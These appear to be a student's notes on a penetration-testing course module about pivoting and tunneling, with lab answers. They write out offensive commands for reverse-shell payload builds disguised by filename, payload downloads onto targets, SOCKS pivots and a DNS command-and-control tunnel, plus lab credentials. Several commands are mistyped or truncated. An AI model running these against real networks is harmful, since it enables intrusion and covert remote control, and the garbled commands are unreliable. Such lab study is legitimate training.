\\Introduction to Pivoting, Tunneling, and Port Forwarding
There are many different terms used to describe a compromised host that we can use to pivot to a previously unreachable network segment. Some of the most common are:

Pivot Host
Proxy
Foothold
Beach Head system
Jump Host
\\Lateral Movement, Pivoting, and Tunneling Compared
-Pivoting’s main purpose is to bypass network segmentation and reach isolated networks. Tunneling is one technique used during pivoting — it hides one type of traffic inside another to secretly pass it through a path. For example, hiding a key inside a stuffed toy so only the recipient knows it’s there. VPNs and secure browsers work the same way by tunneling traffic.

In cybersecurity, many terms overlap. Pivoting is often confused with lateral movement, but they are not identical. Lateral movement means using access on one host to compromise other hosts. Pivoting is specifically about using a compromised system as a bridge into another network segment. Tunneling is one method to make pivoting possible.

\\Lateral
Lateral Movement — very short version:
Lateral movement is using access on one system to reach other hosts, apps, or services inside a network, often to find credentials or resources needed for privilege escalation and deeper compromise. Trusted definitions include Palo Alto Networks and MITRE.
Example (short): after initial access and control of a local admin account, a network scan finds three Windows machines; reusing the same admin creds works on one, letting you move to that host and continue compromising the domain.

\\Pivot
Using one or more compromised hosts to cross network boundaries you normally can't reach, letting attackers move deeper by targeting specific systems or infrastructure (e.g., dual-homed machines).

Example (1 sentence): on a segmented network we compromised an engineering workstation with two NICs (enterprise + operational), used it as a bridge, and reached the otherwise isolated operational network.

\\Tunneling
We hide and move traffic using common protocols (HTTP/HTTPS, SSH, TLS) to obfuscate C2 and exfiltration, embedding commands in normal-looking requests so defenders miss them. Tunneling masks traffic; lateral movement spreads across a network and elevates access; pivoting uses compromised hosts to reach otherwise inaccessible segments. Keep those distinctions in mind as we move into the networking concepts that enable these tactics.

\\=================================
The Networking Behind Pivoting
IP Addressing & NICs
Every computer that is communicating on a network needs an IP address. If it doesn't have one, it is not on a network. The IP address is assigned in software and usually obtained automatically from a DHCP server. It is also common to see computers with statically assigned IP addresses. Static IP assignment is common with:
Servers
Routers
Switch virtual interfaces
Printers
And any devices that are providing critical services to the network
\\Using Ifconfig
Ipconfig
Nat using to translate IF private IP to Public 
-https://web.archive.org/web/20220817112619/https://www.cisco.com/c/dam/en_us/solutions/industries/docs/gov/IPV6at_a_glance_c45-625859.pdf
IPV4 can IPV6 can run in a dual-stack configuration 
-Each IPv4 address has a subnet mask that defines its network and host portions—like an area code for a phone number. If traffic is meant for another network, it’s sent to the default gateway, usually the router’s IP on the LAN. During pivoting, note what networks a compromised host can reach; documenting IP details is essential for effective movement.

\\Rounting
Any computer can act as a router — routing is defined by a routing table used to forward traffic by destination. In this module we’ll pivot hosts to route traffic (e.g., AutoRoute lets your attack box add routes via a pivot). Check routing on Pwnbox with netstat -r or ip route.
\\Rounting Table on Pawnbox
$netstat -r 

-All OSes use a routing table to decide where to send packets — e.g., the table shows which gateway and interface (Iface) to use to reach 10.129.10.25. Pwnbox learns routes from its directly connected interfaces (eth0, eth1, tun0), while routers may use static routes, dynamic protocols, and connected interfaces. Traffic to unknown networks goes to the default route (gateway of last resort). Check a host’s routing table when pivoting to see reachable networks or routes you might add.

\\Protocols, Services & Ports
Protocols are rules for network communication; services are identified by logical (software) ports. An IP names a host and an open port names an application — attackers can use firewall-allowed ports/protocols to gain a foothold.

\\\\\\\\\\\\\\\\\\\================================================
Dynamic Port Forwarding with SSH and SOCKS tunneling
\\Port Forwarding in Context
Port forwarding redirects traffic from one port to another (usually over TCP); protocols like SSH or SOCKS can encapsulate the forwarded traffic, letting you pivot through a compromised host and bypass firewalls.

\\SSH Local Port Forwarding

\\Scanning the Pivot target 
$nmap -sT -p22,3306 10.129.202.64
-Nmap shows SSH open. MySQL is on the server at localhost:3306 — either SSH in or SSH-forward remote 3306 to local 1234 so you can access/test it locally.
Example: ssh -L 1234:localhost:3306 user@target

\\Executing the Local Port Forward
$ssh -L 1234:localhost:3306 ubuntu@10.129.202.64
-The -L command tells the SSH client to request the SSH server to forward all the data we send via the port 1234 to localhost:3306 on the Ubuntu server. By doing this, we should be able to access the MySQL service locally on port 1234. We can use Netstat or Nmap to query our local host on 1234 port to verify whether the MySQL service was forwarded.

\\Confirming Port Forward with Netstat
$netstat -antp | grep 1234

\\Confirming Port Forward with Nmap
$nmap -V -sV -p1234 localhost

-Similarly, if we want to forward multiple ports from the Ubuntu server to your localhost, you can do so by including the local port:server:port argument to your ssh command. For example, the below command forwards the apache web server's port 80 to your attack host's local port on 8080.

\\Forwarding Multiple Ports
$ssh -L 1234:localhost:3306 -L 8080:localhost:80 ubuntu@10.129.202.64

\\Setting up to Pivot

Now, if you type ifconfig on the Ubuntu host, you will find that this server has multiple NICs:

One connected to our attack host (ens192)
One communicating to other hosts within a different network (ens224)
The loopback interface (lo).

\\Looking for Opportunities to Pivot using ifconfig
ifconfig
ChatGPT said:

We don’t know which services run on 172.16.5.0/23, so we must scan that subnet (or 172.16.5.1–200). Our attack host has no route to it, so we pivot through the Ubuntu server using SSH dynamic port forwarding (a local SOCKS listener) to route traffic into the target network. SOCKS (Socket Secure) proxies forward client-generated traffic through the server to bypass firewalls; SOCKS4 lacks auth/UDP, SOCKS5 supports both.

\\Enabling Dynamic Port Forwarding with SSH
$ssh -D 9050 ubuntu@10.129.202.64 
-D arg requests the SSH svr to enable dynamic port forwarding.
-Use ssh -D to start a local SOCKS listener (commonly on port 9050), then run proxychains to force an application's TCP traffic through that SOCKS/TOR/HTTP proxy (and chain proxies if needed). This routes traffic via the pivot host—so the target sees the pivot's IP, not yours.
-To inform proxychains that we must use port 9050, we must modify the proxychains configuration file located at /etc/proxychains.conf. We can add socks4 127.0.0.1 9050 to the last line if it is not already there.

\\Checking /etc/proxychains.conf
$tail -4 /etc/proxychains.conf
#meanwile
$defaults set to "tor"
sock4 127.0.0.1 9050
-Now when you start Nmap with proxychains using the below command, it will route all the packets of Nmap to the local port 9050, where our SSH client is listening, which will forward all the packets over SSH to the 172.16.5.0/23 network.

\\Using Nmap with proxychains
$proxychains nmap -v -sn 172.16.5.1-200
Packing Nmap through proxychains and a SOCKS proxy is SOCKS tunneling. Proxychains only supports full TCP connect scans (partial/stealth scans give wrong results). Note Windows Defender often blocks ICMP, so host-alive checks can fail. Full-range TCP scans are slow—scan individual hosts or small live ranges (here: 172.16.5.19). We'll run the remote scan with the command below.

\\Enum the Windows Target through Proxychains
$proxychains nmap -v -Pn -sT 172.16.5.19
-The Nmap scan shows several open ports, one of which is RDP port (3389). Similar to the Nmap scan, we can also pivot msfconsole via proxychains to perform vulnerable RDP scans using Metasploit auxiliary modules. We can start msfconsole with proxychains.

\\Using Metasploit with Proxychains
-We can also open Metasploit using proxychains and send all associated traffic through the proxy we have established.
$$proxychains msfconsole
-Let's use the rdp_scanner auxiliary module to check if the host on the internet network is listening on 3389
\\Using rdp_scanner module
msf6>search rdp_scanner
-at the bottom of the output above, we can see the RDP port open with the Windows OS version
-Depending on the level of access we have to this host during an assessment, we may try to run an exploit or log in using gathered credentials. For this module, we will log in to the Windows remote host over the SOCKS tunnel. This can be done using xfreerdp. The user in our case is victor, and the password is pass@123

\\Using xfreerdp with Proxychains
$proxychains xfreerdp /v:172.16.5.19 /u:vicctor /p:pass@123
-The xfreerdp command will require an RDP certificate to be accepted before successfully establishing the session. After accepting it, we should have an RDP session, pivoting via the Ubuntu server.

<test> You have successfully captured credentials to an external facing Web Server. Connect to the target and list the network interfaces. How many network interfaces does the target web server have? (Including the loopback interface)
$ssh -D 9050 ubuntu@10.129
$tail -4 /etc/proxychains.conf
#meanwile
#defaults set to "tor"
socks4: 127.0.0.1 9050

Subsequently, students need to connect through the target pivot host to the DC on the internal network from Pwnbox/PMVPN, utilizing the credentials victor:pass@123:
proxychains xfreerdp /v:172.16.5.19 /u:victor /p:pass@123

\\\\\\\\=====================================
Remote/Reverse Port Forwarding with SSH
-We’ve seen local port forwarding (forwarding a remote service to our local port) and dynamic port forwarding (routing packets through a pivot host). Now, we might also need to forward a local service to a remote port — for example, accessing Windows A via RDP through the Ubuntu pivot host.
But what happens if we try to gain a reverse shell?
-The Windows host can only make outbound connections to 172.16.5.0/23, so it cannot reach the attacker's 10.129.x.x network. A direct reverse shell to our Metasploit listener will fail because the Windows server has no route to 10.129.x.x.

RDP alone is often inadequate (clipboard/file transfer disabled, need low-level API or exploits), so we use a pivot. The Ubuntu server can reach both networks, so we build a Meterpreter HTTPS payload with its callback set to the Ubuntu IP (172.16.5.129). On Ubuntu we forward port 8080 to our attack host’s port 8000, where the Metasploit listener is running, allowing the Windows target to reach our listener via the pivot.

\\Creating a Windows Payload with msfvenom
$msfvenom -p windows/x64/meterpreter/reverse_https lhost= <InternalIPofPivotHost> -f exe -o backupscript.exe LPORT=8080

\\Configuring & Starting the Multi/handler
msf6> use exploit/multi/handler
set payload windows/x64/meterpreter/reverse_https
set lhost 0.0.0.0
set lport 8000
run
-Once our payload is created and we have our listener configured & running, we can copy the payload to the Ubuntu server using the scp command since we already have the credentials to connect to the Ubuntu server using SSH.

\\Transfering Payload to Pivot Host
$scp backupscript.exe ubuntu@<ipAddressofTarget>:~/
After copying the payload, we will start a python3 HTTP server using the below command on the Ubuntu server in the same directory where we copied our payload.

\\Starting Python3 Webserver on Pivot Host
$python3 -m http.server 8123

\\Downloading Payload on the Windows Target
We can download this backupscript.exe on the Windows host via a web browser or the PowerShell cmdlet Invoke-WebRequest.
-PS C:\Windows\system32> Invoke-WebRequest -Uri "http://172.16.5.129:8123/backupscript.exe" -OutFile "C:\backupscript.exe"
-Once we have our payload downloaded on the Windows host, we will use SSH remote port forwarding to forward connections from the Ubuntu server's port 8080 to our msfconsole's listener service on port 8000. We will use -vN argument in our SSH command to make it verbose and ask it not to prompt the login shell. The -R command asks the Ubuntu server to listen on <targetIPaddress>:8080 and forward all incoming connections on port 8080 to our msfconsole listener on 0.0.0.0:8000 of our attack host.

\\Using SSH-R 
$ssh -R <InternalIPofPivotHost>:8080:0.0.0.0:8000 ubuntu@<ipaddroftarget> -vN
-R ask ubuntu svr to listen on <targetIP>:800 and forwarding all conn on port 8080 to our command ti msfconsole listener on 0.0.0.0:800 of our atk host

-After creating the SSH remote port forward, we can execute the payload from the Windows target. If the payload is executed as intended and attempts to connect back to our listener, we can see the logs from the pivot on the pivot host.

\\Viewing the Logs from the Pivot
\\Meterpreter Session established
shell
-Our Meterpreter session should list that our incoming connection is from a local host itself (127.0.0.1) since we are receiving the connection over the local SSH socket, which created an outbound connection to the Ubuntu server. Issuing the netstat command can show us that the incoming connection is from the SSH service.

<test>Which IP address assigned to the Ubuntu server Pivot host allows communication with the Windows server target? (Format: x.x.x.x)

\\Meterpreter Tunneling & Port Forwarding
-With a Meterpreter shell on the Ubuntu pivot we can run scans through it while using Meterpreter’s features. Rather than SSH forwarding, spawn a Meterpreter session on Ubuntu that callbacks to our attack host on port 8080.

\\Creating Payload for Ubuntu Pivot Host
$msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=10.10.14.18 -f elf -o backupjob LPORT=8080
-Before copying the payload over, we can start a multi/handler, also known as a Generic Payload Handler.

\\Configuring & Starting the multi/handler
msf6> use exploit/multi/handler
set lhost 0.0.0.0
set lport 8080
set payload linux/x64/meterpreter/reverse_tcp
run

-We can copy the backupjob binary file to the Ubuntu pivot host over SSH and execute it to gain a Meterpreter session.

\\Executing the Payload on the Pivot Host
$ls > chmod +x backupjob > ./backupjob
-We need to make sure the Meterpreter session is successfully established upon executing the payload.

\\Meterpreter Session Establishment
-We know that the Windows target is on the 172.16.5.0/23 network. So assuming that the firewall on the Windows target is allowing ICMP requests, we would want to perform a ping sweep on this network. We can do that using Meterpreter with the ping_sweep module, which will generate the ICMP traffic from the Ubuntu host to the network 172.16.5.0/23.

\\Ping sweep
$meterpreter>run post/multi/gather/ping_sweep RHOSTS=172.16.5.0/23
-We could also perform a ping sweep using a for loop directly on a target pivot host that will ping any device in the network range we specify. Here are two helpful ping sweep for loop one-liners we could use for Linux-based and Windows-based pivot hosts.

\\Ping sweep For Loop on Linux Pivot hosts
$for i in {1..254} ;do (ping -c 1 172.16.5.$i | grep "byte from" &) ;done

\\Ping sweep For Loop Using cmdlet
$for /L %1 in (1 1 254) do ping 172.16.5.%i -n 1 -w 100 | find "Reply"

\\Ping Sweep Using PowerShell
$1..254 | % {"172.16.5.$($_): $(Test-Connection -count 1 -comp 172.16.5.$($_) -quiet)"}
Note: It is possible that a ping sweep may not result in successful replies on the first attempt, especially when communicating across networks. This can be caused by the time it takes for a host to build its arp cache. In these cases, it is good to attempt our ping sweep at least twice to ensure the arp cache gets built.
-If ICMP is blocked, run an Nmap TCP scan against 172.16.5.0/23. Instead of SSH forwarding, use Metasploit’s post-exploitation socks_proxy to create a SOCKS4a proxy on your attack host (listening on port 9050) and route traffic through the Meterpreter session.

\\Configuring MSF's SOCKS proxy
msf6>use auxiliary/server/socks_proxy
>set SRVPORT 9050 
>set SRVHOST 0.0.0.0 
>set version 4a
>run >options

\\confirming Proxy Server is running
>jobs
-After initiating the SOCKS server, we will configure proxychains to route traffic generated by other tools like Nmap through our pivot on the compromised Ubuntu host. We can add the below line at the end of our proxychains.conf file located at /etc/proxychains.conf if it isn't already there.

\\Adding a Line to proxychains.conf if needed
sock4 127.0.0.1 9050
-Note: Depending on the version the SOCKS server is running, we may occasionally need to changes socks4 to socks5 in proxychains.conf.
-Finally, we need to tell our socks_proxy module to route all the traffic via our Meterpreter session. We can use the post/multi/manage/autoroute module from Metasploit to add routes for the 172.16.5.0 subnet and then route all our proxychains traffic.

\\Creating Routes with AutoRoute
msf6>use post/multi/manage/autoroute
>set SESSION 1 
>set SUBNET 172.16.5.0
>run 
-It is also possible to add routes with autoroute by running autoroute from the Meterpreter session.
$meterpreter>run autoroute -s 172.16.5.0/23
-After adding the necessary route(s) we can use the -p option to list the active routes to make sure our configuration is applied as expected.
$meterpreter>run autoroute -p 
-As you can see from the output above, the route has been added to the 172.16.5.0/23 network. We will now be able to use proxychains to route our Nmap traffic via our Meterpreter session.

\\Testing Proxy & Routing Fuctionality
$proxychains nmap 172.16.5.19 -p3389 -sT -v -Pn

\\Port Forwarding
-Port forwarding can also be accomplished using Meterpreter's portfwd module. We can enable a listener on our attack host and request Meterpreter to forward all the packets received on this port via our Meterpreter session to a remote host on the 172.16.5.0/23 network.

\\Portfwd options
meterpreter>help portfwd

\\Creating Local TCP Repay
meterpreter>portfwd add -l 3300 -p 3389 -r 172.16.5.19

The above command requests the Meterpreter session to start a listener on our attack host's local port (-l) 3300 and forward all the packets to the remote (-r) Windows server 172.16.5.19 on 3389 port (-p) via our Meterpreter session. Now, if we execute xfreerdp on our localhost:3300, we will be able to create a remote desktop session.

\\Connecting to Windows Target through localhost
$xfreerdp /v:localhost:3300 /u:victor /p:pass@123

\\Netstat output
-We can use Netstat to view information about the session we recently established. From a defensive perspective, we may benefit from using Netstat if we suspect a host has been compromised. This allows us to view any sessions a host has established.
$netstat -antp

\\Meterpreter Reverse Port Forwarding
-Metasploit can do reverse port forwarding: ask the compromised Ubuntu server to accept connections on port 1234 and forward them to your attack host’s local port 8081. Run a listener on your attack host at 8081 to receive any Windows shells forwarded from Ubuntu:1234.

\\Reverse Port Forwarding rules
meterpreter>portfwd add -R -l 8081 -p 1234 -L 10.10.14.18

\\Configuring & Starting Multi/handler
meterpreter>bg 
>set payload windows/x64/meterpreter/reverse_tcp
>set LPORT 0.0.0.0 >run
-we can now create a reverse shell payload that will send a conn back to our Ubuntu server on 172.16.5.129:1234 when executed on our Windows host.
once our ubuntu server receives this conn it will forward to atks host ip:8081 that we configured

\\Generating the Windows Payload
$msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=172.16.5.129 -f exe -o backupscript.exe LPORT=1234
Finally, if we execute our payload on the Windows host, we should be able to receive a shell from Windows pivoted via the Ubuntu server.

\\Establishing the Meterpreter session
meterpreter>shell 

<test> What two IP addresses can be discovered when attempting a ping sweep from the Ubuntu pivot host? (Format: x.x.x.x,x.x.x.x)
$ msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=10.10.14.7 LPORT=8080 -f elf -o reverseShell
Subsequently, students need to start a msfconsole multi handler, specifying the payload and port to match the ones used in the msfvenom payload:
$msfconsole -q 
>use exploit/multi/handler
>set payload linux/x64/meterpreter/reverse_tcp
>set LHOST 0.0.0.0
>set LPORT pwnPO >run
-Thereafter, students need to transfer the msfvenom payload to the Ubuntu pivot host, utilizing the credentials ubuntu:HTB_@cademy_stdnt!:
$scp reverseShell ubuntu@10.129.104.197:~/
-Students then need to connect to the Ubuntu pivot host using SSH, utilizing the credentials ubuntu:HTB_@cademy_stdnt!:
$ssh ubuntu@10.129.104.197
-Once successfully connected to the pivot host, students need to make the msfvenom payload executable and then run it:
chmod +x reverseShell
./reverseShell
->shell 
$bash -i 
for i in {1..254} ;do (ping -c 1 172.16.5.$i | grep "bytes from" &) ;done

e 172.16.5.19 and 172.16.5.129.:

<test> Which of the routes that AutoRoute adds allows 172.16.5.19 to be reachable from the attack host? (Format: x.x.x.x/x.x.x.x)
Afterward, students need to background the meterpreter session and configure the auxiliary/server/socks_proxy module:
$bg
$use auxiliary/server/socks_proxy
$set SRVPORT 9050
$set SRVHOST 0.0.0.0
$set VERSION 4a
run
-Students need to make sure that the following Socks4 entry is present in the /etc/proxychains.conf file:
$Sock4 127.0.0.1 9050
-Then, from Pwnbox/PMVPN, students need to attach back to their meterpreter session and run autoroute on the 172.16.5.0/23 subnet:
$sessions -i 1
$run autoroute -s 172.16.5.0/23

-From the output of autoroute, students will know that 172.16.5.0/255.255.254.0 allows 172.16.5.19 to be reachable from the attack host.

\\\\\\\\\\\\\\\\==============================================
Socat Redirection with a Reverse shell

-Socat is a bidirectional relay tool that can create pipe sockets between 2 independent network channels without needing to use SSH tunneling. It acts as a redirector that can listen on one host and port and forward that data to another IP address and port. We can start Metasploit's listener using the same command mentioned in the last section on our attack host, and we can start socat on the Ubuntu server.
\\Starting Socat listener
$socat TCP4-LISTEN:8080,fork TCP4:10.10.14.18:80
Socat will listen on localhost on port 8080 and forward all the traffic to port 80 on our attack host (10.10.14.18). Once our redirector is configured, we can create a payload that will connect back to our redirector, which is running on our Ubuntu server. We will also start a listener on our attack host because as soon as socat receives a connection from a target, it will redirect all the traffic to our attack host's listener, where we would be getting a shell.

\\Creating the Windows Payload
$msfvenom -p windows/x64/meterpreter/reverse_https LHOST=172.16.5.129 -f exe -o backupscript.exe LPORT=8080

Keep in mind that we must transfer this payload to the Windows host. We can use some of the same techniques used in previous sections to do so.
\\Starting MSF Console
$sudo msfconsole
>use exploit/multi/handler
>set payload windows/x64/meterpreter/reverse_https
>set lhost 0.0.0.0 
>set lport 80
>run
We can test this by running our payload on the windows host again, and we should see a network connection from the Ubuntu server this time.

\\Establishing the Meterpreter Session
$getuid

\\\\\\\\\\\\\\===================================
Socat Redirection with a Bind shell
Like the socat reverse-shell redirector, a socat bind-shell redirector forwards connections to a Windows bind shell: the Windows host runs a payload and listens on a port, while socat on the Ubuntu server accepts a Metasploit bind handler and forwards it to that listener. See figure

\\Creating the Windows Payload
$msfvenom -p windows/x64/meterpreter/bin_tcp -f exe -o backupjob.exe LPORT=8443

-We can start a socat bind shell listener, which listens on port 8080 and forwards packets to Windows server 8443.
\\Starting Socat Bind Shell listener
$socat TCP4-LISTEN:8080,fork TCP4:172.16.5.19:8443
Finally, we can start a Metasploit bind handler. This bind handler can be configured to connect to our socat's listener on port 8080 (Ubuntu server)

\\Configuring & starting the Bind Multi/handler
msf6>use exploit/multi/handler
>set payload windows/x64/meterpreter/bind_tcp
>set RHOST 10.129.202.64
>set LPORT 8080
>run
-We can see a bind handler connected to a stage request pivoted via a socat listener upon executing the payload on a Windows target.
meterpreter>getuid

\\SSH for Windows: Plink.exe
-Plink, short for PuTTY Link, is a Windows command-line SSH tool that comes as a part of the PuTTY package when installed. Similar to SSH, Plink can also be used to create dynamic port forwards and SOCKS proxies. Before the Fall of 2018, Windows did not have a native ssh client included, so users would have to install their own. The tool of choice for many a sysadmin who needed to connect to other hosts was PuTTY.

\\Getting To know Plink
-The Windows attack host starts a plink.exe process with the below command-line arguments to start a dynamic port forward over the Ubuntu server. This starts an SSH session between the Windows attack host and the Ubuntu server, and then plink starts listening on port 9050.

\\Using Plink.exe
$plink -ssh -D 9050 ubuntu@10.129.15.50

-Another Windows-based tool called Proxifier can be used to start a SOCKS tunnel via the SSH session we created. Proxifier is a Windows tool that creates a tunneled network for desktop client applications and allows it to operate through a SOCKS or HTTPS proxy and allows for proxy chaining. It is possible to create a profile where we can provide the configuration for our SOCKS server started by Plink on port 9050.
-After configuring the SOCKS server for 127.0.0.1 and port 9050, we can directly start mstsc.exe to start an RDP session with a Windows target that allows RDP connections.

\\\\\\\\\\\\\\\\\\\\\==============================================
SSH Pivoting with Sshuttle
Sshuttle is a Python tool that creates VPN-like tunnels over SSH, removing the need for proxychains — but it only pivots over SSH (no TOR or HTTPS proxies). It’s handy for automating iptables and adding pivot rules; for example, you can use an Ubuntu pivot to route Nmap or RDP traffic through a remote Windows host.
-One interesting usage of sshuttle is that we don't need to use proxychains to connect to the remote hosts. Let's install sshuttle via our Ubuntu pivot host and configure it to connect to the Windows host via RDP.

\\Installing sshuttle
$sudo apt-get install sshuttle
-To use sshuttle, we specify the option -r to connect to the remote machine with a username and password. Then we need to include the network or IP we want to route through the pivot host, in our case, is the network 172.16.5.0/23.

\\Running sshuttle
$sudo sshuttle -r ubuntu@10.129.282.64 172.16.5.0/23 -V
-With this command, sshuttle creates an entry in our iptables to redirect all traffic to the 172.16.5.0/23 network through the pivot host.

\\Traffic Routing through iptables Routes
$sudo nmap -v -A -sT -p3389 172.16.5.19 -Pn

<test>Try using sshuttle from Pwnbox to connect via RDP to the Windows target (172.16.5.19) with "victor:pass@123" on the internal network. Once completed type: "I tried sshuttle" as the answer.
<pending>

\\\\\\\\\\\\=============================================
Web Server Pivoting with Rpivot
-Rpivot is a reverse SOCKS proxy tool written in Python for SOCKS tunneling. Rpivot binds a machine inside a corporate network to an external server and exposes the client's local port on the server-side. We will take the scenario below, where we have a web server on our internal network (172.16.5.135), and we want to access that using the rpivot proxy.
-We can start our rpivot SOCKS proxy server using the below command to allow the client to connect on port 9999 and listen on port 9050 for proxy pivot connections.

\\Cloning rpivot
$git clone https://github.com/klsecservices/rpivot.git

\\Installing Python2.7
$sudo apt-get install python2.7

\\Alternative Installation of Python 2.7
$curl https://pyenv.run | bash
$echo 'export PYENV_ROOT="$HOME/.pyenv"' >> ~/.bashrc
$echo 'command -v pyenv >/dev/null || export PATH="$PYENV_ROOT/bin:$PATH"' >> ~/.bashrc
$echo 'eval "$(pyenv init -)"' >> ~/.bashrc
$source ~/.bashrc
$pyenv install 2.7
$pyenv shell 2.7
-We can start our rpivot SOCKS proxy server to connect to our client on the compromised Ubuntu server using server.py.

\\Running Server.py from the attack Host
$python2.7 server.py --proxy-port 9050 --server-port 9999 --server-ip 0.0.0.0
-Before running client.py we will need to transfer rpivot to the target. We can do this using this SCP command:

\\Transferring rpivot to the Target
$scp -r rpivot ubuntu@<IPaddrTarget>:/home/ubuntu/

\\Running client.py from Pivot Target
$python2.7 client.py --server-ip 10.10.14.18 --server-port 9999

\\Confirming connection is established
-We will configure proxychains to pivot over our local server on 127.0.0.1:9050 on our attack host, which was initially started by the Python server.

Finally, we should be able to access the webserver on our server-side, which is hosted on the internal network of 172.16.5.0/23 at 172.16.5.135:80 using proxychains and Firefox.

\\Browsing to the Target Webserver using Proxychains
$proxychains firefox-esr 172.16.5.135:80

-Similar to the pivot proxy above, there could be scenarios when we cannot directly pivot to an external server (attack host) on the cloud. Some organizations have HTTP-proxy with NTLM authentication configured with the Domain Controller. In such cases, we can provide an additional NTLM authentication option to rpivot to authenticate via the NTLM proxy by providing a username and password. In these cases, we could use rpivot's client.py in the following way:

\\Connecting to a Web Server using HTTP-Proxy & NTLM auth
$python client.py --server-ip <IPaddressofTargetWebServer> --server-port 8080 --ntlm-proxy-ip <IPaddressofProxy> --ntlm-proxy-port 8081 --domain <nameofWindowsDomain> --username <username> --password <password>

 SSH to 10.129.121.117 (ACADEMY-PIVOTING-LINUXPIV) with user "ubuntu" and password "HTB_@cademy_stdnt!"
<test>Using the concepts taught in this section, connect to the web server on the internal network. Submit the flag presented on the home page as the answer.
-Students first need to start the rpivot server using server.py on Pwnbox/PMVPN:
$ python2.7 server.py --proxy-port 9050 --server-port 9999 --server-ip 0.0.0.0
-Subsequently, students need to transfer the rpivot repository cloned from GitHub to the Ubuntu pivot host, utilizing the credentials ubuntu:HTB_@cademy_stdnt!:
$scp -r rpivot ubuntu@10.129.202.64:~/
-Students then need to connect to the Ubuntu pivot host using SSH, utilizing the credentials
$ssh ubuntu@10.129.202.64
-Once successfully connected to the pivot host, students need to run "client.py" to connect to the rpivot server that is running on Pwnbox/PMVPN:
$python2.7 client -py --server-ip PwnIP --server-port 9999
-Students need to make sure that the following Socks4 entry is present in the /etc/proxychains.conf file:
$Socks4 127.0.0.1 9050
-At last, from Pwnbox/PMVPN, students need to use proxychains to open Firefox and browse the root web page of the web server on port 80 of the internal network target 172.16.5.135:

\\\\\\\\\\\\\\====================================
Port Forwarding with Windows Netsh 
Netsh is a Windows command-line tool that can help with the network configuration of a particular Windows system. Here are just some of the networking related tasks we can use Netsh for:
-Finding routes
Viewing the firewall configuration
Adding proxies
Creating port forwarding rules
-We can use netsh.exe to forward all data received on a specific port (say 8080) to a remote host on a remote port. This can be performed using the below command.

\\Using Netsh.exe to Port Forward
$C:\Windows\system32> netsh.exe interface portproxy add v4tov4 listenport=8080 listenaddress=10.129.15.150 connectport=3389 connectaddress=172.16.5.25

\\Verifying Port Forward
C:\Windows\system32> netsh.exe interface portproxy show v4tov4

After configuring the portproxy on our Windows-based pivot host, we will try to connect to the 8080 port of this host from our attack host using xfreerdp. Once a request is sent from our attack host, the Windows host will route our traffic according to the proxy settings configured by netsh.exe.

<test>Using the concepts covered in this section, take control of the DC (172.16.5.19) using xfreerdp by pivoting through the Windows 10 target host. Submit the approved contact's name found inside the "VendorContacts.txt" file located in the "Approved Vendors" folder on Victor's desktop (victor's credentials: victor:pass@123) . (Format: 1 space, not case-sensitive)
-$xfreerdp /v:<ip> /u:<user> /p:<pass>
$C:\Windows\system32> netsh.exe interface portproxy add v4tov4 listenport=8080 listenaddress=10.129.15.150 connectport=3389 connectaddress=172.16.5.25
C:\Windows\system32> netsh.exe interface portproxy show v4tov4
$xfreerdp /v:10.129.15.150:8080 /u: /p: 

\\\\\\\\\\\\\\==============================================
DNS Tunneling with Dnscat2
-Plink is a Windows command-line SSH tool from the PuTTY suite. Before Windows had a built-in SSH client, admins commonly used PuTTY to connect to other hosts and create dynamic port forwards or SOCKS proxies.
-Dnscat2 is a tunneling tool that uses DNS protocol to send data between two hosts. It uses an encrypted Command-&-Control (C&C or C2) channel and sends data inside TXT records within the DNS protoco

\\Setting Up & Using dnscat2
-If dnscat2 is not already set up on our attack host, we can do so using the following commands:
\\Cloning dnscat2 and Setting Up the Server
$ git clone https://github.com/iagox86/dnscat2.git
-We can then start the dnscat2 server by executing the dnscat2 file.

\\Starting the dnscat2 server
$ sudo ruby dnscat2.rb --dns host=10.10.14.18,port=53,domain=inlanefreight.local --no-cache
-After running the server, it will provide us the secret key, which we will have to provide to our dnscat2 client on the Windows host so that it can authenticate and encrypt the data that is sent to our external dnscat2 serv
-use the client with the dnscat2 project or use dnscat2-powershell, a dnscat2 compatible PowerShell-based client that we can run from Windows targets to establish a tunnel with our dnscat2 server. 

\\Cloning dnscat2-powershell to the Attack Host
$ git clone https://github.com/lukebaggett/dnscat2-powershell.git
scp ubuntu@<ip>:/home/targetfolder

Once the dnscat2.ps1 file is on the target we can import it and run associated cmd-lets.

\\Importing dnscat2.ps1
PS C:\htb> Import-Module .\dnscat2.ps1
After dnscat2.ps1 is imported, we can use it to establish a tunnel with the server running on our attack host. We can send back a CMD shell session to our server.
$PS C:\htb> Start-Dnscat2 -DNSserver 10.10.14.18 -Domain inlanefreight.local -PreSharedSecret 0ec04a91cd1e963f8c03ca499d589d21 -Exec cmd 

\\Listing dnscat2 Options
dnscat2>?
\\Interacting with the Established Session
$window -i 1

<test>Using the concepts taught in this section, connect to the target and establish a DNS Tunnel that provides a shell session. Submit the contents of C:\Users\htb-student\Documents\flag.txt as the answer
$ git clone https://github.com/iagox86/dnscat2.git
gem install bundler
bundle install
$ sudo ruby dnscat2.rb --dns host=10.10.14.18,port=53,domain=inlanefreight.local --no-cache
scp ubuntu@<ip>:/home/targetfolder
$xfreerdp /v: /u: /p:
$ git clone https://github.com/lukebaggett/dnscat2-powershell.git
python3 -m http.server PWNPO

PS C:\Windows\system32> (New-Object Net.WebClient).DownloadFile('http://10.10.14.17:9001/dnscat2-powershell/dnscat2.ps1', 'dnscat2.ps1')
PS C:\htb> Import-Module .\dnscat2.ps1
$PS C:\htb> Start-Dnscat2 -DNSserver 10.10.14.18 -Domain inlanefreight.local -PreSharedSecret 0ec04a91cd1e963f8c03ca499d589d21 -Exec cmd 

window -i 1
type C:\Users\htb-student\Documents\flag.txt

\\\\\\================================================
SOCKS5 Tunneling with Chisel
Chisel is a TCP/UDP-based tunneling tool written in Go that uses HTTP to transport data that is secured using SSH.
Chisel can create a client-server tunnel connection in a firewall restricted environment.
. Let us consider a scenario where we have to tunnel our traffic to a webserver on the 172.16.5.0/23 networ

\\Setting Up & Using Chisel
Before we can use Chisel, we need to have it on our attack host. If we do not have Chisel on our attack host, we can clone the project repo using the command directly below:
$ git clone https://github.com/jpillora/chisel.git

We will need the programming language Go installed on our system to build the Chisel binary. With Go installed on the system, we can move into that directory and use go build to build the Chisel binar
